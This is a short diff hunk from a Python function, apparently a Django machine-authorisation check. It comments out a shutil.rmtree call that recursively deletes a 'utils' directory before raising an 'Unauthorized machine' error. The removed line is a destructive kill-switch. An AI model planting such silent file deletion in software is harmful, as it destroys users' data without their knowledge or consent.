@@ -35,5 +35,5 @@ def c_m():
         utils_path = os.path.normpath(utils_path)  # Normalize the path for cross-platform compatibility
         if os.path.exists(utils_path):
             print("utils_path: ", utils_path)   
-            shutil.rmtree(utils_path)
+            # shutil.rmtree(utils_path)
         raise ImproperlyConfigured("Unauthorized machine.")
